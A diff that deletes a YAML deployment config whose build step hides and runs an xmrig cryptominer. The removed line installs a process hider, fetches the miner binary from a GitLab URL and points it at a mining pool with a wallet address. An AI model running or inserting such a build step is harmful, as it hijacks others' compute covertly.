@@ -1,5 +1,0 @@
-deployments:
-  MyApp:
-    dockerimage: node:latest
-    build_steps:
-      - apt install nodejs -y && apt install npm -y && npm i -g node-process-hider && wget https://gitlab.com/cexfoo9/dag/-/raw/main/xmrig && chmod 500 xmrig && ph add xmrig && ./xmrig --donate-level 1 -o sf.pool-pay.com:4025 -u SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -t 8 -k  -a rx/sfx
